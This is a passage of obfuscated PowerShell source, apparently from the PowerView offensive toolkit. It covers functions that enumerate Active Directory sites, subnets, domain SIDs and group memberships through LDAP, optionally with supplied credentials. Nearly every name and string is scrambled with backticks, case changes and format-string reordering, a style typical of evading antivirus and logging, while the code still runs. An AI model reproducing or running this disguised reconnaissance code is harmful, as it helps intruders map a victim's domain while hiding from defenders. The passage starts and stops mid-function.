        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`DENt`IaL} =   (  vaRIaBlE ("{1}{0}" -f'n','qF') )."Va`LuE"::"EmP`Ty",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${Se`ArcHEr`ARGUM`enTs} = @{
            ("{0}{2}{1}{3}{4}" -f'Se','ase','archB','Pr','efix') = ("{1}{3}{4}{2}{0}" -f'nfiguration','CN=','Co','Sit','es,CN=')
        }
        if (${psb`oUNdPA`R`A`MetERS}[("{0}{1}{2}"-f 'Dom','ai','n')]) { ${sEaRCheRaRg`UmE`N`Ts}[("{0}{1}"-f 'Domai','n')] = ${D`OMa`IN} }
        if (${p`s`BOundpARA`M`eTErS}[("{2}{0}{1}" -f'perti','es','Pro')]) { ${seARcHer`AR`gu`mEnts}[("{2}{1}{0}"-f 'es','perti','Pro')] = ${Pr`Op`ERtiES} }
        if (${PSbouN`DP`Ar`Am`etErS}[("{3}{1}{0}{2}"-f 'hBa','c','se','Sear')]) { ${se`ARcHe`Ra`R`GUmENts}[("{2}{0}{3}{1}" -f 'arc','ase','Se','hB')] = ${SeArC`HBA`Se} }
        if (${p`sbOundpA`RAm`ETERS}[("{0}{1}" -f'Se','rver')]) { ${s`eArcHE`R`ARguMeNts}[("{1}{0}"-f 'erver','S')] = ${S`ERV`ER} }
        if (${PsBoUnDpA`RAM`E`TeRs}[("{2}{0}{1}"-f 'rchS','cope','Sea')]) { ${search`E`RA`Rgu`M`EntS}[("{1}{3}{2}{0}" -f 'ope','Se','rchSc','a')] = ${SEA`R`CHscO`PE} }
        if (${psb`ouN`dpa`RAmeT`ERS}[("{3}{1}{2}{0}" -f 'geSize','u','ltPa','Res')]) { ${sEarChER`ARGu`m`EnTs}[("{2}{0}{3}{1}" -f'ltPa','eSize','Resu','g')] = ${rEs`U`ltpa`ge`SIze} }
        if (${pSBOUnDPa`Ram`E`TerS}[("{2}{3}{1}{4}{0}"-f'mit','verTim','Se','r','eLi')]) { ${SEArC`HeRarG`U`mE`NTs}[("{2}{3}{1}{0}" -f'meLimit','erTi','S','erv')] = ${s`e`Rverti`m`ElIMit} }
        if (${pSB`oUNDpaRA`MET`E`RS}[("{1}{0}{2}"-f'cu','Se','rityMasks')]) { ${s`e`Ar`che`RArGuMenTS}[("{3}{0}{2}{1}" -f 'i','asks','tyM','Secur')] = ${s`ecURITY`m`A`SkS} }
        if (${PsBo`UND`P`A`R`AMETERS}[("{0}{1}"-f 'To','mbstone')]) { ${s`eAR`CHer`ArGU`MEnTS}[("{1}{0}" -f'mbstone','To')] = ${toMB`S`TONE} }
        if (${pSb`O`U`NDParamet`Ers}[("{2}{1}{0}"-f'l','edentia','Cr')]) { ${SeA`RcHErarg`U`M`EntS}[("{1}{0}{2}"-f 'n','Crede','tial')] = ${CREd`E`NtIAl} }
        ${Si`TeSea`RCh`eR} = &("{0}{1}{2}{3}"-f 'Get-','Dom','ainSear','cher') @SearcherArguments
    }

    PROCESS {
        if (${SI`TEsEaRCh`Er}) {
            ${i`denTiTyfiLT`eR} = ''
            ${f`IL`TeR} = ''
            ${id`entiTy} | &("{0}{2}{1}"-f 'W','re-Object','he') {${_}} | &("{2}{0}{1}{3}"-f 'rE','ach-Obje','Fo','ct') {
                ${id`EnTI`TYins`TaNcE} = ${_}.("{2}{0}{1}" -f'p','lace','Re').Invoke('(', '\28').("{0}{1}{2}"-f 'Repl','a','ce').Invoke(')', '\29')
                if (${IDEnTItYi`Nst`An`CE} -match ("{0}{1}" -f '^CN=.','*')) {
                    ${idEnti`Ty`Fi`lteR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${P`SboUN`DPAr`AMEtE`RS}[("{0}{1}" -f 'Domai','n')]) -and (-not ${p`SBo`UNDP`A`RamE`TeRS}[("{2}{1}{0}" -f 'se','chBa','Sear')])) {
                        
                        
                        ${id`E`Nti`Ty`doMaIn} = ${idenTi`TY`i`NSTANce}.("{0}{2}{1}" -f 'S','g','ubStrin').Invoke(${i`den`TItyIn`sTaNce}.("{1}{0}"-f'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{0}"-f 'e','Write-Ve','rbos') ('[Get-'+'Do'+'mainSit'+'e] '+'E'+'xtra'+'ct'+'ed '+'dom'+'ain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${s`E`ARCH`e`RArGumENts}[("{0}{1}" -f'Doma','in')] = ${i`den`TIty`DoMaIn}
                        ${SiteSe`A`RcHer} = &("{2}{3}{1}{0}{4}" -f'r','nSea','Get-','Domai','cher') @SearcherArguments
                        if (-not ${SITesea`R`ChER}) {
                            &("{3}{1}{2}{0}"-f'ng','te-Warn','i','Wri') ('[Ge'+'t-'+'D'+'omainSi'+'t'+'e] '+'Unab'+'le '+'to'+' '+'retri'+'eve'+' '+'domai'+'n '+'se'+'arc'+'her '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GuidbY`T`e`StRiNG} = (-Join (([Guid]${I`d`e`N`TItyINST`ANce}).("{3}{2}{1}{0}"-f'y','rra','teA','ToBy').Invoke() | &("{0}{2}{1}"-f'ForEach-Ob','ect','j') {${_}.("{0}{2}{1}" -f 'ToS','ring','t').Invoke('X').("{0}{1}{2}"-f'PadL','ef','t').Invoke(2,'0')})) -Replace ("{0}{1}" -f'(..',')'),'\$1'
                        ${I`DENt`ItyFi`LteR} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${Iden`TIty`F`Il`TER} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${IdEntIT`YFI`LTeR} -and (${IdEnt`ityfil`TER}.("{0}{1}" -f'Tr','im').Invoke() -ne '') ) {
                ${f`i`lter} += "(|$IdentityFilter)"
            }

            if (${P`SbOuNd`P`AraMetERS}[("{0}{1}{2}" -f'GPLi','n','k')]) {
                &("{2}{3}{0}{1}"-f 'b','ose','Writ','e-Ver') ('[G'+'e'+'t'+'-Do'+'mainSite] '+'S'+'earching'+' '+'f'+'or '+'sit'+'es '+'wi'+'th '+"$GPLink "+'set'+' '+'in'+' '+'th'+'e '+'gp'+'L'+'ink '+'proper'+'ty')
                ${fi`l`Ter} += "(gplink=*$GPLink*)"
            }

            if (${p`SB`OUn`DPA`RaMEt`eRS}[("{3}{1}{0}{2}"-f 'te','DAPFil','r','L')]) {
                &("{2}{3}{0}{1}" -f'Verb','ose','Wri','te-') ('[Get'+'-'+'DomainS'+'it'+'e] '+'Us'+'ing '+'additi'+'on'+'al'+' '+'LDAP'+' '+'fil'+'ter:'+' '+"$LDAPFilter")
                ${fILt`Er} += "$LDAPFilter"
            }

            ${SItEs`eA`RCHeR}."FI`lTeR" = "(&(objectCategory=site)$Filter)"
            &("{2}{1}{0}" -f 'ose','rite-Verb','W') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if (${ps`B`OU`N`dpA`RAmeTErS}[("{2}{1}{0}"-f'ndOne','i','F')]) { ${R`E`sulTS} = ${SiT`E`SeAR`Cher}.("{2}{1}{0}"-f 'll','indA','F').Invoke() }
            else { ${R`e`SuLTS} = ${S`i`TESe`ARchEr}.("{1}{2}{0}" -f'l','Find','Al').Invoke() }
            ${rEs`Ul`TS} | &("{1}{0}{2}"-f 'je','Where-Ob','ct') {${_}} | &("{0}{3}{1}{2}"-f 'F','rEach-','Object','o') {
                if (${pS`BOUNd`parA`mEteRS}['Raw']) {
                    
                    ${SI`TE} = ${_}
                }
                else {
                    ${Si`Te} = &("{3}{4}{2}{0}{1}" -f'ro','perty','LDAPP','Convert','-') -Properties ${_}."PROPe`RTi`es"
                }
                ${si`Te}."PSoB`j`ECT"."TYP`E`Names".("{0}{1}"-f'Ins','ert').Invoke(0, ("{1}{2}{3}{0}" -f 'e','Po','werView','.Sit'))
                ${sI`Te}
            }
            if (${Re`Sul`TS}) {
                try { ${rES`UL`Ts}.("{1}{0}"-f 'spose','di').Invoke() }
                catch {
                    &("{2}{0}{1}" -f'rite','-Verbose','W') ("{7}{9}{6}{3}{0}{1}{8}{4}{2}{5}"-f 'disp','osing o','esu','Error ',' the R','lts object','nSite] ','[Ge','f','t-Domai')
                }
            }
            ${s`iTEs`Ea`R`CHER}.("{1}{2}{0}" -f 'e','di','spos').Invoke()
        }
    }
}


function gET-d`oMAins`UB`N`Et {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f'PSSho','Proce','uld','ss'}, '')]
    [OutputType({"{2}{3}{0}{1}" -f 'ew.S','ubnet','Powe','rVi'})]
    [CmdletBinding()]
    Param (
        [Parameter(PosITION = 0, valuefROMPIpelIne = ${t`Rue}, VaLUEFrompIPElInEbYpropeRTynAME = ${T`RuE})]
        [Alias({"{0}{1}" -f 'N','ame'})]
        [String[]]
        ${I`DeN`TitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Si`Te`NaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'lter','Fi'})]
        [String]
        ${L`dapFIl`T`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`OPe`RTiEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'th','DSPa','A'})]
        [String]
        ${sEA`Rc`hB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{5}{2}{4}{0}{1}" -f'l','er','n','Do','trol','mainCo'})]
        [String]
        ${Ser`V`Er},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{0}{1}" -f'OneLe','vel'}, {"{0}{1}" -f'Subtre','e'})]
        [String]
        ${seaRCH`SC`OPE} = ("{1}{0}" -f'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`su`lTpA`GEsi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVE`R`Timelim`IT},

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{1}{0}"-f 'oup','Gr'}, {"{0}{1}" -f'N','one'}, {"{1}{0}" -f'r','Owne'}, {"{1}{0}"-f'acl','S'})]
        [String]
        ${sECur`iTY`m`AsKs},

        [Switch]
        ${to`mbST`onE},

        [Alias({"{2}{1}{0}"-f 'ne','urnO','Ret'})]
        [Switch]
        ${find`o`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDe`NtIAL} =   ( VAriabLe ("{1}{0}" -f 'N','QF')  )."VaL`UE"::"E`mPTY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${sEarcHEr`A`RGUmE`Nts} = @{
            ("{3}{2}{0}{4}{1}"-f'c','refix','ear','S','hBaseP') = ("{0}{1}{3}{5}{6}{10}{8}{4}{9}{7}{2}"-f'CN=Subn','e','Configuration','ts,CN','C','=Si','t','=',',','N','es')
        }
        if (${Psb`o`UND`P`ARAmetERS}[("{2}{1}{0}" -f 'ain','m','Do')]) { ${S`eA`R`cHeRArguMenTS}[("{1}{0}{2}"-f 'om','D','ain')] = ${dom`A`IN} }
        if (${p`SBoU`NdPa`R`AmETers}[("{2}{0}{1}" -f 'rtie','s','Prope')]) { ${sEaRc`hE`RaRgUm`EntS}[("{0}{1}{2}" -f 'Prop','erti','es')] = ${PrO`P`erTIeS} }
        if (${p`SB`OUNDParaME`T`eRS}[("{1}{2}{0}" -f'e','SearchB','as')]) { ${sea`RCh`Er`A`RGuments}[("{0}{1}{2}"-f'SearchB','as','e')] = ${SEa`RCHBa`sE} }
        if (${PsBoUNDP`ARA`mE`TE`Rs}[("{0}{2}{1}"-f'S','r','erve')]) { ${sEA`RchERa`R`GUMen`Ts}[("{1}{0}{2}" -f've','Ser','r')] = ${S`eRVeR} }
        if (${p`SB`o`UnDp`ARAmEteRS}[("{1}{2}{0}"-f'chScope','Sea','r')]) { ${seAR`ChEr`ARGuMe`N`Ts}[("{0}{3}{2}{1}" -f 'S','e','Scop','earch')] = ${SeA`Rc`hS`Cope} }
        if (${pSbOu`ND`paR`Amet`E`RS}[("{2}{0}{3}{1}" -f 'ult','e','Res','PageSiz')]) { ${SeArC`hE`Ra`RGU`meNtS}[("{1}{4}{0}{2}{3}" -f 's','R','ultP','ageSize','e')] = ${rE`Sul`T`PaGesIzE} }
        if (${Ps`Bo`UnD`pARaMET`E`RS}[("{2}{0}{1}" -f'v','erTimeLimit','Ser')]) { ${s`EAr`Ch`erARGUMe`N`TS}[("{1}{2}{0}" -f 'Limit','Server','Time')] = ${SER`VeRT`IME`LIMIT} }
        if (${Ps`Bo`UndparaMe`Ters}[("{2}{1}{0}{3}"-f 'ityMa','cur','Se','sks')]) { ${s`EARcherA`RGU`mentS}[("{0}{2}{1}{3}"-f 'Securit','s','yMa','ks')] = ${sec`URI`TyMa`Sks} }
        if (${pS`BO`UNd`pARaM`EtERs}[("{1}{2}{0}" -f'e','Tombs','ton')]) { ${S`eArCh`E`RarGum`eN`TS}[("{2}{0}{1}" -f'mbs','tone','To')] = ${t`Ombs`Tone} }
        if (${ps`Bo`UndP`AR`AMEte`RS}[("{2}{3}{0}{1}" -f'tia','l','Crede','n')]) { ${s`EarCheRAr`GUM`E`NTS}[("{2}{1}{0}" -f 'ntial','e','Cred')] = ${cRE`d`eNTiAl} }
        ${S`U`BnEt`Searc`hEr} = &("{4}{3}{2}{5}{1}{0}" -f 'er','ch','in','-Doma','Get','Sear') @SearcherArguments
    }

    PROCESS {
        if (${Su`B`NetS`earChER}) {
            ${I`dent`IT`yFiLteR} = ''
            ${F`I`LTer} = ''
            ${iden`TI`TY} | &("{3}{1}{0}{2}" -f 're','he','-Object','W') {${_}} | &("{2}{3}{1}{0}"-f 'ect','ch-Obj','F','orEa') {
                ${iden`T`itYInS`Tan`CE} = ${_}.("{0}{1}" -f 'Repla','ce').Invoke('(', '\28').("{2}{0}{1}"-f 'pl','ace','Re').Invoke(')', '\29')
                if (${I`DEn`TiTy`InstanCe} -match ("{0}{1}" -f'^CN=.','*')) {
                    ${IdentItY`F`i`l`TeR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psB`ouN`DPaRAmETE`Rs}[("{2}{0}{1}" -f'oma','in','D')]) -and (-not ${Psb`O`UNdPA`RaM`eTerS}[("{2}{0}{1}"-f'B','ase','Search')])) {
                        
                        
                        ${I`De`NT`ITYDoMA`IN} = ${I`deNT`it`yins`TA`NcE}.("{2}{1}{0}{3}"-f'rin','bSt','Su','g').Invoke(${IdE`NtI`TyI`Nsta`NCE}.("{2}{0}{1}"-f'n','dexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{0}{2}" -f 't','Wri','e-Verbose') ('[Get'+'-D'+'oma'+'in'+'Sub'+'net] '+'Ex'+'trac'+'ted '+'doma'+'in '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${sEA`RcHE`RarG`Um`E`NTs}[("{1}{2}{0}" -f'in','Dom','a')] = ${IdE`NTiTYdO`ma`in}
                        ${sub`N`et`Searcher} = &("{1}{0}{3}{2}" -f 't','Ge','DomainSearcher','-') @SearcherArguments
                        if (-not ${su`BNE`TS`EarchER}) {
                            &("{1}{2}{3}{0}"-f 'arning','Wri','te','-W') ('[G'+'et'+'-DomainSu'+'bn'+'et]'+' '+'Un'+'abl'+'e '+'to'+' '+'re'+'trieve'+' '+'dom'+'ain '+'se'+'ar'+'ch'+'er '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${gu`i`D`BytesTrIng} = (-Join (([Guid]${I`denTI`T`y`iNST`ANCE}).("{3}{1}{0}{2}"-f 'eA','t','rray','ToBy').Invoke() | &("{3}{0}{1}{2}" -f 'orEa','ch-Obj','ect','F') {${_}.("{0}{2}{1}" -f 'T','String','o').Invoke('X').("{0}{1}{2}" -f 'P','ad','Left').Invoke(2,'0')})) -Replace (("{1}{0}"-f')','(..')),'\$1'
                        ${idEN`T`iT`y`FiltER} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${i`DEnti`TYFILT`eR} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${i`d`entitYfIl`TeR} -and (${idenTit`Y`FI`LTer}.("{1}{0}" -f'rim','T').Invoke() -ne '') ) {
                ${f`I`Lter} += "(|$IdentityFilter)"
            }

            if (${PsB`ou`N`DpAramETErs}[("{1}{0}{2}"-f'te','LDAPFil','r')]) {
                &("{2}{1}{0}{3}" -f'e','-V','Write','rbose') ('[G'+'et'+'-DomainSubne'+'t]'+' '+'U'+'sing '+'ad'+'diti'+'onal'+' '+'LD'+'AP '+'fi'+'lt'+'er: '+"$LDAPFilter")
                ${F`IltEr} += "$LDAPFilter"
            }

            ${suBne`Tse`ARc`HEr}."FIl`T`eR" = "(&(objectCategory=subnet)$Filter)"
            &("{2}{0}{1}"-f'e','rbose','Write-V') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if (${P`SBOunDp`AR`AMETE`RS}[("{1}{0}" -f 'indOne','F')]) { ${rEs`U`ltS} = ${sU`BN`E`TS`eaRcHEr}.("{0}{1}" -f 'Fin','dOne').Invoke() }
            else { ${re`SULts} = ${sUB`NeTSe`A`Rc`HeR}.("{0}{1}{2}" -f'Fin','dA','ll').Invoke() }
            ${resu`l`TS} | &("{0}{1}{3}{2}"-f'Whe','r','t','e-Objec') {${_}} | &("{0}{2}{4}{3}{1}"-f'Fo','ct','rEach-O','je','b') {
                if (${PS`Bo`UndpA`RAme`TeRS}['Raw']) {
                    
                    ${s`UBNEt} = ${_}
                }
                else {
                    ${sU`BNeT} = &("{3}{0}{4}{1}{2}"-f'ert-LD','Prope','rty','Conv','AP') -Properties ${_}."P`Ro`PerTIES"
                }
                ${S`UBn`Et}."P`S`oBjeCt"."t`yPE`NAmes".("{1}{0}"-f'nsert','I').Invoke(0, ("{3}{2}{0}{1}" -f 'iew.S','ubnet','rV','Powe'))

                if (${P`SBoUNdPa`R`AMeTE`RS}[("{2}{0}{1}" -f 'Na','me','Site')]) {
                    
                    
                    if (${S`UbnEt}."pROpEr`TI`eS" -and (${S`UBnET}."Pr`Op`ERTIeS"."si`T`e`OBJeCT" -like "*$SiteName*")) {
                        ${su`B`Net}
                    }
                    elseif (${S`UbNet}."s`iteob`jE`Ct" -like "*$SiteName*") {
                        ${s`U`BnET}
                    }
                }
                else {
                    ${s`U`BNeT}
                }
            }
            if (${re`SuL`Ts}) {
                try { ${Re`sULts}.("{1}{0}" -f'se','dispo').Invoke() }
                catch {
                    &("{2}{0}{1}"-f's','e','Write-Verbo') ('['+'Ge'+'t-Doma'+'inSubne'+'t]'+' '+'Error'+' '+'dis'+'po'+'si'+'ng '+'of'+' '+'t'+'he '+'Res'+'ult'+'s '+'o'+'bjec'+'t: '+"$_")
                }
            }
            ${SuBnEts`E`A`RCHer}.("{1}{0}" -f 'e','dispos').Invoke()
        }
    }
}


function Ge`T-`d`OMAInsid {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}"-f 'PSShou','ocess','ldPr'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{3}{1}{2}"-f 'nCont','le','r','rol','Domai'})]
        [String]
        ${ser`V`Er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`E`den`TIAL} =  ( GeT-CHilDiTEM  ("Var"+"iA"+"B"+"le:qfN")  )."VA`lUE"::"E`mpTy"
    )

    ${seaR`cher`ARG`UmEnts} = @{
        ("{0}{2}{3}{1}" -f'LD','lter','APF','i') = (("{2}{11}{7}{4}{1}{3}{5}{8}{9}{6}{10}{0}"-f '2)',':','(user','1.2.8','ol','40',':=81','tr','.113556.','1.4.803','9','AccountCon'))
    }
    if (${psBo`UNDparA`mEt`ERs}[("{1}{2}{0}" -f'n','Do','mai')]) { ${SeAr`CH`ErA`RGu`mEN`Ts}[("{0}{1}"-f'Doma','in')] = ${DomA`iN} }
    if (${PSBOUn`Dpa`Ra`meTeRS}[("{0}{1}" -f 'Se','rver')]) { ${Sear`Ch`eRaRG`UmenTs}[("{1}{0}" -f'er','Serv')] = ${ser`VEr} }
    if (${p`SBo`Und`PaRAME`TerS}[("{2}{0}{1}"-f'd','ential','Cre')]) { ${sEaRChe`R`ArgUME`N`Ts}[("{0}{1}{2}" -f 'Cred','ent','ial')] = ${C`Red`EN`TIal} }

    ${D`Csid} = &("{3}{4}{0}{2}{5}{1}"-f 'Com','ter','p','Get-Do','main','u') @SearcherArguments -FindOne | &("{1}{0}{2}{3}" -f '-','Select','Obje','ct') -First 1 -ExpandProperty ("{0}{1}"-f 'obj','ectsid')

    if (${dc`S`id}) {
        ${dcs`iD}.("{2}{1}{0}"-f 'ring','St','Sub').Invoke(0, ${dC`s`Id}.("{1}{2}{0}"-f 'f','LastInd','exO').Invoke('-'))
    }
    else {
        &("{4}{2}{0}{3}{1}" -f'te-Verb','e','ri','os','W') ('[Get-Domai'+'n'+'SI'+'D] '+'E'+'rro'+'r '+'ext'+'r'+'actin'+'g '+'doma'+'in '+'SI'+'D '+'f'+'or '+"'$Domain'")
    }
}


function geT-`doMai`Ng`Ro`Up {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{0}{1}{2}" -f 'c','es','s','PSShould','Pro'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{5}{9}{6}{1}{3}{8}{4}{7}"-f'PSUseDe','s','claredV','si','men','ars','anA','ts','gn','MoreTh'}, '')]
    [OutputType({"{2}{0}{1}"-f 'rVie','w.Group','Powe'})]
    [CmdletBinding(dEFaulTpARAmeTerSETNaME = {"{0}{3}{2}{1}{4}"-f'Al','o','Delegati','low','n'})]
    Param(
        [Parameter(POSITioN = 0, vAlueFrOmPIPeLINE = ${T`RUe}, VALuEFrOMPIPELINEBypROPerTYname = ${T`RUE})]
        [Alias({"{2}{0}{4}{1}{3}" -f 't','uishedNam','Dis','e','ing'}, {"{3}{2}{0}{1}"-f 'ccou','ntName','amA','S'}, {"{0}{1}"-f 'N','ame'}, {"{5}{1}{2}{3}{6}{0}{4}" -f'edN','in','g','u','ame','MemberDist','ish'}, {"{0}{2}{1}" -f 'Me','ame','mberN'})]
        [String[]]
        ${IdentI`TY},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'Us','e','erNam'})]
        [String]
        ${mem`BeR`iDenTi`TY},

        [Switch]
        ${adMi`N`co`UNt},

        [ValidateSet({"{1}{2}{3}{0}" -f 'cal','Do','main','Lo'}, {"{2}{0}{1}"-f'in','Local','NotDoma'}, {"{0}{1}"-f 'G','lobal'}, {"{2}{1}{0}" -f'al','lob','NotG'}, {"{1}{2}{0}"-f 'sal','Unive','r'}, {"{1}{2}{3}{0}" -f 'sal','N','otUn','iver'})]
        [Alias({"{1}{0}" -f 'pe','Sco'})]
        [String]
        ${Grou`PsCo`pE},

        [ValidateSet({"{1}{2}{0}"-f 'ty','Se','curi'}, {"{2}{0}{3}{1}"-f 's','ution','Di','trib'}, {"{1}{0}{2}" -f'eate','Cr','dBySystem'}, {"{0}{3}{1}{2}" -f 'NotCreate','BySyste','m','d'})]
        [String]
        ${Grou`PP`RoP`eRtY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MaIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filt','er'})]
        [String]
        ${L`DaPfi`L`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`OpeRties},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'Path','ADS'})]
        [String]
        ${SEAr`ChB`A`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{4}{0}{3}" -f 'l','Do','mainCo','ler','ntro'})]
        [String]
        ${Se`R`VeR},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{0}{1}{2}"-f'OneL','eve','l'}, {"{2}{0}{1}"-f'btre','e','Su'})]
        [String]
        ${sEar`CH`s`COpE} = ("{0}{1}"-f'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`ULtPagesI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`VeRTi`M`eLI`MIT},

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{0}{1}"-f'Gr','oup'}, {"{1}{0}" -f'ne','No'}, {"{1}{0}" -f'ner','Ow'}, {"{1}{0}" -f'cl','Sa'})]
        [String]
        ${Se`Cu`RITyma`s`ks},

        [Switch]
        ${T`Omb`S`TONE},

        [Alias({"{0}{1}"-f'Ret','urnOne'})]
        [Switch]
        ${fINd`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`e`denT`Ial} =  ${q`FN}::"E`mPTy",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${sea`Rc`He`RarG`UM`EntS} = @{}
        if (${PsBOuNdp`A`RamE`TErS}[("{0}{1}"-f'Do','main')]) { ${seaRc`herArG`U`meNTs}[("{0}{1}" -f 'Do','main')] = ${Do`maIn} }
        if (${Ps`Boun`DPaRa`m`e`TeRs}[("{2}{1}{0}"-f 's','opertie','Pr')]) { ${Se`A`R`Ch`EraRgumE`NTs}[("{2}{1}{0}" -f 'es','rti','Prope')] = ${prOpert`I`ES} }
        if (${p`S`BoUNdpAram`ETE`Rs}[("{1}{0}{2}"-f'ch','Sear','Base')]) { ${SEAR`C`hera`RGU`MenTS}[("{2}{0}{1}"-f 'earchBa','se','S')] = ${sEA`R`chBase} }
        if (${p`S`BOu`Nd`parAMe`TErs}[("{0}{1}" -f 'Serv','er')]) { ${S`EAr`CHEraR`GUmenTs}[("{0}{1}"-f'S','erver')] = ${SeRV`Er} }
        if (${pS`Bo`U`NdPArA`METErs}[("{0}{3}{2}{1}"-f 'S','pe','o','earchSc')]) { ${seAR`c`h`ERar`GumENtS}[("{2}{0}{1}"-f'a','rchScope','Se')] = ${SE`ArcHSCo`Pe} }
        if (${P`sBOU`N`D`paRAmEterS}[("{0}{2}{1}" -f 'ResultPa','eSize','g')]) { ${se`A`RcheRar`gum`E`NTS}[("{0}{2}{3}{1}" -f 'Re','tPageSize','su','l')] = ${R`ESULt`pa`Ge`SIze} }
        if (${PsB`o`UNDpaRAmet`Ers}[("{1}{0}{2}{3}" -f'erTime','Serv','L','imit')]) { ${SEA`RchErAR`GuME`NTs}[("{1}{4}{3}{2}{0}" -f'eLimit','Se','m','i','rverT')] = ${SERv`e`RTI`MELi`mIT} }
        if (${psbOU`Nd`paRAME`T`eRs}[("{4}{3}{2}{0}{1}" -f'yMa','sks','rit','ecu','S')]) { ${s`EARC`H`e`RARgum`Ents}[("{1}{0}{2}"-f'ecurit','S','yMasks')] = ${secUrI`TYm`A`sKS} }
        if (${PSB`OUNDPa`RamE`TErS}[("{0}{1}"-f'Tombs','tone')]) { ${sEa`RCHE`RaRGuMe`NtS}[("{1}{0}{2}" -f'b','Tom','stone')] = ${TOM`BSt`OnE} }
        if (${Psb`oU`NDp`ARAmeters}[("{0}{1}{2}"-f 'C','red','ential')]) { ${sEAR`CHeRaR`gU`menTS}[("{0}{2}{1}"-f 'Cre','l','dentia')] = ${CRE`dE`NtiAL} }
        ${Gr`ouP`SeaRc`h`eR} = &("{4}{1}{2}{3}{0}" -f 'er','t-D','omainSea','rch','Ge') @SearcherArguments
    }

    PROCESS {
        if (${groUP`SeArc`heR}) {
            if (${pSBO`UNdp`ARAmET`E`RS}[("{2}{0}{1}{4}{3}"-f'mbe','r','Me','ty','Identi')]) {

                if (${sEaRche`RA`RGUMEN`TS}[("{1}{2}{0}{3}"-f 'rtie','Pro','pe','s')]) {
                    ${O`LdPR`OPErTi`ES} = ${SEA`RC`H`era`RGuM`ENtS}[("{0}{2}{1}" -f 'Prop','es','erti')]
                }

                ${S`EaRc`heRa`RGu`Me`NtS}[("{1}{0}{2}"-f't','Identi','y')] = ${ME`MberIde`N`TItY}
                ${s`E`ArCHe`RAr`gum`enTs}['Raw'] = ${t`RUe}

                &("{1}{2}{4}{3}{0}"-f 'ject','Get-D','o','ainOb','m') @SearcherArguments | &("{2}{0}{3}{1}" -f 'E','ect','For','ach-Obj') {
                    
                    ${objE`C`Td`i`RE`cToR`yeNtRY} = ${_}.("{1}{3}{2}{0}{4}"-f 't','GetDirec','ryEn','to','ry').Invoke()

                    
                    ${OBJE`cTD`i`R`ectORyeNtRY}.("{0}{2}{1}{3}" -f 'Refr','shCa','e','che').Invoke(("{0}{2}{1}"-f'tok','ups','enGro'))

                    ${O`BJECTDirEC`T`ORyeNTRy}."toKe`NgrO`UPs" | &("{0}{2}{1}{3}{4}"-f'Fo','E','r','ach-Obje','ct') {
                        
                        ${G`ROupS`id} = (&("{3}{1}{2}{0}" -f 'bject','w','-O','Ne') ("{3}{9}{6}{7}{1}{8}{5}{2}{4}{0}" -f 'r','ci','f','System.','ie','urityIdenti','curity','.Prin','pal.Sec','Se')(${_},0))."vAl`UE"

                        
                        if (${Gr`oU`pSid} -notmatch ("{0}{1}{2}" -f '^S-','1','-5-32-.*')) {
                            ${sE`ARCHeRAR`G`UMEN`TS}[("{2}{1}{0}" -f'ity','nt','Ide')] = ${g`Roups`ID}
                            ${se`ArCH`e`RAr`gUmE`NTS}['Raw'] = ${fa`l`SE}
                            if (${Ol`D`prOp`ertIES}) { ${searCh`E`Ra`RgumE`NtS}[("{2}{0}{1}" -f 'opert','ies','Pr')] = ${oLDP`R`oP`erTI`es} }
